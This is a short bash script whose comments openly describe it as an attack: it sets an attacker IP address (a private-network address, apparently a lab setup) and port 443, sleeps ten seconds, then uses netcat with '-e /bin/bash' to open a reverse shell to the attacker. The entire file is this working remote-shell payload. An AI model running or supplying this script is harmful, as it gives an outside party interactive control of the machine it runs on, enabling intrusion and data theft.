#!/bin/bash

# Attackers IP Address is stored
IPADDRESS=192.168.2.128

# The port the attacker will be listening on
PORT=443

# Ten seconds delay
sleep 10

# The Victim gives the Attacker access via -e /bin/bash
nc $IPADDRESS $PORT -e /bin/bash